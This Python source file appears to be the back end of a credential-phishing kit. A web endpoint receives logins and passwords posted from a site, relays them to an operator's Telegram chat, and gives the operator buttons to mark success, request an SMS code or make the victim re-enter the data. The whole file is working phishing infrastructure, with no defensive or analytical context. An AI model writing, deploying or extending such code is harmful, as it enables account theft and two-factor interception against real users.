from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from aiohttp import web
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# Обработка входящих данных с сайта
async def handle_form(request):
    data = await request.post()
    login = data.get("login", "—")
    password = data.get("password", "—")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("✅ Успех", callback_data="success")],
        [InlineKeyboardButton("✉️ SMS", callback_data="sms")],
        [InlineKeyboardButton("❌ Неверные данные", callback_data=f"wrong:{login}:{password}")]
    ])

    msg = f"🔐 Новые данные с сайта:\n👤 Логин: <code>{login}</code>\n🔑 Пароль: <code>{password}</code>"
    await bot.send_message(ADMIN_CHAT_ID, msg, parse_mode="HTML", reply_markup=keyboard)
    return web.Response(text="OK")

@dp.callback_query_handler(lambda c: c.data.startswith("wrong"))
async def handle_wrong(callback: types.CallbackQuery):
    _, login, password = callback.data.split(":")
    await callback.message.answer("🔁 Попросите пользователя ввести данные повторно.")
    # тут можно добавить уведомление или API-запрос на сайт

@dp.callback_query_handler(lambda c: c.data == "success")
async def handle_success(callback: types.CallbackQuery):
    await callback.answer("✅ Успешный вход!")

@dp.callback_query_handler(lambda c: c.data == "sms")
async def handle_sms(callback: types.CallbackQuery):
    await callback.answer("📨 Отправка SMS...")

# HTTP-сервер для Render.com
async def on_startup(dp):
    app = web.Application()
    app.router.add_post("/send", handle_form)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", 8080)))
    await site.start()

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
